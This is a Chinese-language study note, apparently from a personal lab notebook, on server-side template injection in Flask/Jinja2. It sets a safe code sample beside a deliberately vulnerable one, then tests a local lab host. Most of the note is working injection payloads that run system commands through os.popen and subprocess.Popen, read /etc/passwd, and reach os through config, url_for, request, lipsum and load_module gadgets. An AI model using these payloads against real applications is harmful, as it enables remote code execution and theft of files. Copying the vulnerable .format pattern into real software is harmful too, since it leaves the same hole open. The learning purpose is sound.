@@ -1,0 +1,176 @@
+### 一段不存在SSTI的代码
+```python
+from flask import Flask, render_template, request, redirect,render_template_string
+
+app = Flask(__name__)
+@app.route('/',methods=['GET'])
+def index():
+	str = request.args.get('ben')
+	html_str = '''
+		<html>
+		<head></head>
+		<body>{{str}}</body>
+		</html>
+	'''
+	return render_template_string(html_str,str=str)
+	
+if __name__ == '__main__':
+	app.debug = True
+	app.run('127.0.0.1','8080')
+```
+	`return render_template_string(html_str,str=str)`
+
+这里str的值通过return render_template_string函数传给html_str加载到body标签中
+body中的str是被{{}}包裹起来的==会预先渲染转义过滤，然后才复制输出！==
+
+### 一段存在SSTI的代码
+```python 
+from flask import Flask, render_template, request, redirect,render_template_string
+
+app = Flask(__name__)
+@app.route('/',methods=['GET'])
+def index():
+	str = request.args.get('ben')
+	html_str = '''
+		<html>
+		<head></head>
+		<body>{0}</body>
+		</html>
+	'''.format(str)
+	return render_template_string(html_str)
+	
+if __name__ == '__main__':
+	app.debug = True
+	app.run('127.0.0.1','8080')
+```
+
+这里的str通过ben参数传参，直接通过format函数写入html_str中，==此时的代码时没有被过滤的，最后render_template_string函数会执行str(如果str是恶意代码则会造成危害)！==
+
+##### 检测是否存在简单的SSTI漏洞
+1. 可以利用四则运算！
+	`http://example.com/welcome?name={{ 7 * 7 }}`
+	- 如果不存在则返回7 * 7
+	- 存在返回49
+2. 利用魔术方法！
+	`http://example.com/welcome?name={{ ''.__class__.__mro__ }}等。。。`
+		`''.__class__` 查看''(当前类型)的所属对象
+		`__mro__` 查看当前类型的所有继承关系
+		`''.__base__` 查看''的父类
+		`__subclasses__()[]` 是 Python 中一个非常重要的内置方法，用于获取类的直接子类,返回的是列表，可以通过[ ]进行选择
+
+# SSTI Flask  jinja2模板注入
+==地址：http://192.168.245.128:18080/flaskBasedTests/jinja2/==
+1. 判断模板类型(虽然这里已知为jinja2)
+   输入${7 * 7}
+   ![](../img/Pasted%20image%2020251018112606.png)
+   失败选择红色路线输入{{7 * 7}}
+   ![](../img/Pasted%20image%2020251018112745.png)   
+2. 发现危险魔术方法
+	  ` {{''.__class__}}`
+	  ![](../img/Pasted%20image%2020251018113130.png)
+	  `{{''.__class__.__bases__}}`
+	  ![](../img/Pasted%20image%2020251018113259.png)
+	  `{{''.__class__.__base__.__subclasses__()}}` 返回很多很多截图放不下
+	  ![](../img/Pasted%20image%2020251018113407.png)
+	  ==返回的结果是 **Python 中所有内置类和加载的类的列表**。这是 SSTI 攻击的关键第一步！==
+	  获取的 **object 类的所有直接子类列表**，包含了当前 Python 环境中所有可用的类。
+	 
+	  这个列表是攻击者的"武器库"，从中可以找到用于：
+		- **文件读取**
+		- **命令执行**
+		- **代码执行**
+		- **信息收集**
+	  进行简单的处理，使文本更好看
+	  ![](../img/Pasted%20image%2020251018114456.png)
+	  从中查找我们可以利用的模块
+	  ==最危险的类（直接利用）==
+	  - **subprocess.Popen** - 索引 166 **这是最强大的命令执行类！**
+		    `{{ ''.__class__.__base__.__subclasses__()[165]('whoami', shell=True, stdout=-1).communicate()[0].strip() }}`
+	  -   **os._wrap_close** - 索引 118 **可以通过它访问 os 模块**
+			`{{ ''.__class__.__base__.__subclasses__()[117].__init__.__globals__['os'].popen('id').read() }}`
+			
+	  ==文件操作相关类==
+	  - **\_frozen_importlib_external.FileLoader** - 索引约 75
+		    `{{ ''.__class__.__base__.__subclasses__()[74].__init__.__globals__['__builtins__']['open']('/etc/passwd').read() }}`
+	 -  **_io._IOBase** - 索引约 83
+		   `{{ ''.__class__.__base__.__subclasses__()[82].__init__.__globals__['open']('/etc/passwd').read() }}`
+	  ==其他可利用的类==
+	  - **warnings.catch_warnings** - 索引约 154**通常包含有用的内置模块**
+		    `{{ ''.__class__.__base__.__subclasses__()[153].__init__.__globals__['__builtins__']['__import__']('os').popen('ls').read() }}`
+	 - **socket.socket** - 索引约 167**可用于网络操作**
+		   `{{ ''.__class__.__base__.__subclasses__()[166].__init__.__globals__['os'] }}`
+		![](../img/Pasted%20image%2020251018115557.png)
+3. ==利于**os._wrap_close**进行攻击 ==
+	- 确认os._wrap_close是否真的存在
+	   `{{ ''.__class__.__base__.__subclasses__()[117] }}`
+	   ![](../img/Pasted%20image%2020251018122133.png)
+	   `{{ ''.__class__.__base__.__subclasses__()[117].__name__ }}`
+	   ![](../img/Pasted%20image%2020251018122148.png)
+	- 确认os._wrap_close是否重载(程序运行时是否已经加载)
+	  `{{ ''.__class__.__base__.__subclasses__()[117].__init__ }}`
+	  ![](../img/Pasted%20image%2020251018122204.png)
+	- 查看全局变量，有哪些函数可以利用
+	  `{{ ''.__class__.__base__.__subclasses__()[117].__init__.__globals__ }}`
+	  ![](../img/Pasted%20image%2020251018122224.png)
+	  这里返回了一些可以使用的os模块函数
+	- 如果直接有 popen 函数
+	  `{{ ''.__class__.__base__.__subclasses__()[117].__init__.__globals__['popen']('ls').read() }}`
+	  ![](../img/Pasted%20image%2020251018122451.png)
+	  没有popen函数
+	  `{{ ''.__class__.__base__.__subclasses__()[117].__init__.__globals__['__builtins__']['__import__']('os').popen('ls').read() }}`
+	  等价于
+	  `{{ ''.__class__.__base__.__subclasses__()[117].__init__.__globals__['__builtins__']['eval']("__import__('os').popen('ls').read()") }}`
+	  ![](../img/Pasted%20image%2020251018122658.png)
+		关键区别
+	
+	| 方面        | 第二个 payload                                                            | 第一个 payload       |
+	| --------   | -------------------------------------------------             | --------------          |
+	| **依赖关系** | 需要 `__builtins__` 和 `os` 模块                                    | 只需要 `popen` 函数 |
+	| **执行路径** | 间接：`__builtins__` → `__import__` → `os` → `popen` | 直接：`popen`          |
+	| **可靠性**    | 更通用，大多数环境都有 `__builtins__`                        | 依赖特定环境配置    |
+	| **隐蔽性**    | 更隐蔽，看起来像正常模块导入                                      | 更直接，可能被检测    |
+		==`{{ self.__dict__.TemplateReference__context.keys() }}`==
+		![](../img/Pasted%20image%2020251018204651.png)
+			这个命令的**核心价值**是:
+			- ✅ **上下文感知** - 了解模板环境
+			- ✅ **目标识别** - 找到可利用的对象
+			- ✅ **信息收集** - 发现配置和敏感数据
+4. os模块执行命令(其它函数调用os模块)
+	- config调用os 
+		- `{{ config.__class__.__init__.__globals__['os'].popen('whoami').read() }}`
+	- url_for调用os
+		- `{{ url_for.__globals__.os.popen('whoami').read() }}`
+	- linecache调用os
+		- `{{ ''.__class__.__bases__[0].__subclasses__()[117].__init__.__globals__['linecache'].os.popen('pwd').read() }}`
+		- 或`{{ ''.__class__.__bases__[0].__subclasses__()[117].__init__.__globals__['__builtins__']['__import__']('linecache').os.popen('whoami').read() }}`
+	- 已经加载os模块子类中直接调用os
+		- `{{ ''.__class__.__bases__[0].__subclasses__()[199].__init__.__globals__['os'].popen("ls -l /opt").read() }}`
+	- Flask全局函数
+		- **get_flashed_messages**
+			- `{{ get_flashed_messages.__globals__.os.popen('pwd').read() }}`
+		- **request** 对象
+			- `{{ request.application.__globals__.os.popen('whoami').read() }}`
+		- **session** 对象
+			- `{{ session.__class__.__init__.__globals__.os.popen('ls').read() }}`
+		- **g** 对象
+			- `{{ g.__class__.__init__.__globals__.os.popen('uname -a').read() }}`
+	- 通过 Jinja2 内置函数
+		- **range** 函数
+			- `{{ range.__class__.__init__.__globals__.os.popen('whoami').read() }}`
+		- **lipsum** 函数
+			- `{{ lipsum.__globals__.os.popen('pwd').read() }}`
+		- **dict** 函数
+			- `{{ dict.__class__.__init__.__globals__.os.popen('ls').read() }}`
+	- ==如果前面都找不到，可以加载第三方库使用load_moudle加载os ==
+		1. 查找是否有_frozen_importlib.BuiltinImporter
+			`{{''.__class__.__base__.__subclasses__()}}`查看所有类
+			搜索BulitinImporter并利用工具==得到其索引==
+			![](../img/Pasted%20image%2020251018212238.png)
+			![](../img/Pasted%20image%2020251018212541.png)索引69
+		2. 加载os模块并执行
+			- 加载os
+			  `{{ ''.__class__.__base__.__subclasses__()[69]["load_module"]("os") }}`
+			  ![](../img/Pasted%20image%2020251018213149.png)
+			  - 执行
+			   `{{ ''.__class__.__base__.__subclasses__()[69]["load_moudle"]("os")["popen"]("ls -l /opt").read() }}`
+			   ![](../img/Pasted%20image%2020251018213022.png)
